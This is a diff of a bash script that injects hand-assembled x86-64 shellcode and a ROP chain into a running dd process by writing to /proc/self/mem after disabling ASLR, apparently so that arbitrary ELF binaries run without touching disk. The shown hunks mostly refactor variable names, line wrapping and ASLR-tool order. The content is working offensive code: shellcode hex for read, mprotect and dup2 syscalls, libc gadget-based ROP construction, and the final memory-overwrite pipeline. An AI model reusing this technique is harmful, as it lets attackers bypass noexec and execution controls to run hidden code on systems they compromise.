@@ -125,11 +125,11 @@ search_symbol()
 
     local symtab_off=$(search_section file $1 .dynsym)
     local symtab_size=$(echo $symtab_off | cut -d' ' -f2)
-    local symtab_size_ent=$(echo $symtab_off | cut -d' ' -f4)
+    local symtabentsize=$(echo $symtab_off | cut -d' ' -f4)
     symtab_off=$(echo $symtab_off | cut -d' ' -f1)
     local symtab=$(od -v -t x1 $1 -N $symtab_size -j $symtab_off| head -n-1 |\
     cut -d' ' -f2- | tr -d ' \n')
-    local symtab_ent_num=$((symtab_size / symtab_size_ent))
+    local symtab_ent_num=$((symtab_size / symtabentsize))
 
     local name1=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- |\
     tr -d ' \n')00
@@ -151,7 +151,7 @@ search_symbol()
     local symbol2_off=""
     for i in $(seq $((symtab_ent_num - 1)))
     do
-        local symtabent=${symtab:$((i * symtab_size_ent * 2)):$((symtab_size_ent * 2))}
+        local symtabent=${symtab:$((i*symtabentsize*2)):$((symtabentsize*2))}
         local symbol_name_idx=$((0x$(endian ${symtabent:0:8})))
         local symbol_name=${strtab:$symbol_name_idx * 2:$len}
         if [ $symbol_name = $name1 ]
@@ -261,7 +261,8 @@ shellcode_loader()
             sc=$sc"0f05"
 
             # read() (makes sure that it reads exactly $fsize bytes)
-            sc=$sc"4831ff48be${origvirt}48ba${fsize}4889f80f054829c24801c64885d275f0"
+            sc=$sc"4831ff48be${origvirt}48ba"$fsize
+            sc=$sc"4889f80f054829c24801c64885d275f0"
 
             # mprotect()
             sc=$sc"4831c0b00a"
@@ -353,8 +354,8 @@ craft_stack()
     do
         if [ $count -lt 5 ]; then count=$((count + 1)); continue; fi;
         stack=$stack$(endian $(printf %016x $argvn_addr)) # argv[n]
-        args=$args$(echo -n "$arg" | od -v -t x1 | head -n -1 |\
-        cut -d' ' -f 2- | tr -d ' \n')00
+        args=$args$(printf "%s" "$arg" | od -v -t x1 | head -n -1 |\
+                    cut -d' ' -f 2- | tr -d ' \n')00
         argvn_addr=$((argvn_addr + ${#arg} + 1))
     done
     # argv[argc] = NULL; envp[0] = NULL;
@@ -448,7 +449,7 @@ craft_payload2()
     sc=$sc$(echo $stack | cut -d' ' -f2)
     stack=$(echo $stack | cut -d' ' -f1)
 
-    # dd makes stdin and stdout point to the input and output of data (if and of)
+    # dd makes stdin and stdout point to the input and output of data (if & of)
     # Fortunately stderr still points to the terminal, so we can make
     # dup2(2, 1); dup2(2, 0); to fix this
     sc=${sc}"4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f05"
@@ -489,7 +490,8 @@ find_gadget()
 craft_rop()
 {
     # Where is located the libc without ASLR in this system
-    local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 | cut -d'-' -f1)
+    local libc_base=$(echo "$dd_maps" | grep $libc_path | head -n1 |\
+                      cut -d'-' -f1)
     libc_base=$((0x$libc_base))
 
     local text=$(read_text $filename)
@@ -550,12 +552,12 @@ craft_rop()
 # Program we are trying to execute
 read -r bin
 
-if [ $(command -v setarch) ]
-then
-    noaslr="setarch `uname -m` -R"
-elif [ $(command -v linux64) ]
+if [ $(command -v linux64) ]
 then
     noaslr="linux64 -R"
+elif [ $(command -v setarch) ]
+then
+    noaslr="setarch `uname -m` -R"
 else
     echo Error: I need some tool to disable ASLR. >&2
     exit
@@ -603,4 +605,4 @@ payload=$(echo -n $rop$payload2 | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # Have fun!
 printf $payload |\
 (sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
-seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock)
+seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock) 2>&1
